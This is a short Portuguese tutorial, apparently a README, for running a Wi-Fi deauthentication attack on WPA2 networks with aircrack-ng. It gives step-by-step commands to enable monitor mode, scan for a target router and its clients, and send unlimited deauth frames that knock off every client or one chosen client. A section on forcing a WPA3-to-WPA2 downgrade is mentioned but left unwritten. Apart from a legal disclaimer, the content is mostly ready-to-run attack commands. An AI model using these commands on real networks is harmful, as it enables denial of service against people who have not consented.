# Wi-Fi Deauther (Redes WPA2)

```
⚠️ Não use isso pra fins desonestos!
Use por sua conta e risco, e por sua responsabilidade.
Ataques desde tipo, em redes não suas é CRIME!
```

> Neste exemplo, estou usando o `Ubuntu 25.04`, no `Kali` a instalação das dependências não vai ser necessária.

Em conexões **WPA3** ou **802.11x(PMW)**  modernas, isso **NÂO VÂO FUNCIONAR**.

> Alguns roteadores modernos têm a opção de trabalhar com **WPA2** por compatibilidade. Nesses casos, você pode forçar o Downgrade de segurança, e depois fazer o ataque ao WPA2.

*Dependências*
```bash
sudo apt update
sudo apt install -y aircrack-ng iw net-tools
```

*Colocar/tirar a placa em modo Monitor*
```bash
# Descobrir o nome da sua interface
iw dev

# Para a rede e colocar placa em modo monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0  # Substitua pelo nome da sua interface

# Parar modo monitor e reestabelecer rede
sudo airmon-ng stop wlan0mon  # Substitua pelo nome da sua interface
sudo systemctl start NetworkManager
```


## Localizar o Alvo

> Com a placa **já no modo monitor**]

Escaneie as redes ao redor para encontrar o BSSID (MAC do roteador) e o Canal (CH) da rede alvo:
```bash
sudo airodump-ng wlan0mon
```

Focar na Rede e Identificar Clientes
```bash
sudo airodump-ng -c [CANAL] --bssid [BSSID_DO_ROTEADOR] wlan0mon
```



## Executar o Ataque de Deauth

Abra um novo terminal (se quiser continuar vendo a lista no outro) e escolha uma das opções abaixo:

**a) Desconectar TODOS os clientes:**
```bash
sudo aireplay-ng --deauth 0 -a [BSSID_DO_ROTEADOR] wlan0mon
```

**b) Desconectar um cliente específico:**
```bash
sudo aireplay-ng --deauth 0 -a [BSSID_DO_ROTEADOR] -c [MAC_DO_CLIENTE] wlan0mon
```


## Como `tentar` forçar o Downgrade para WPA2

> falta escrever isso...
